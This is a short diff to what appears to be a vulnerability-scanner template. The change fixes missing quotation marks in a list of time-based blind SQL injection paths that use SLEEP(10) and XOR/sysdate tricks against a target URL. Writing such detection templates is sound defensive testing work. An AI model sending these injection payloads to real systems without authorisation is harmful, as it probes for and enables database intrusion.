@@ -12,8 +12,8 @@ requests:
   - method: GET
     path:
       - "{{BaseURL}}/dont-work-sqli"
-      - "{{BaseURL}}/0'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z
-      - "{{BaseURL}}'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z      
+      - "{{BaseURL}}/0'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z"
+      - "{{BaseURL}}'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z"  
       - "{{BaseURL}}/(SELECT(0)FROM(SELECT(SLEEP(10)))a)/"
       - "{{BaseURL}}'%20AND%20(SELECT 5735 FROM (SELECT(SLEEP(10)))YpRn)%20AND%20'Jswp'='Jswp"
       - "{{BaseURL}}/'%20AND%20(SELECT 5735 FROM (SELECT(SLEEP(10)))YpRn)%20AND%20'Jswp'='Jswp"
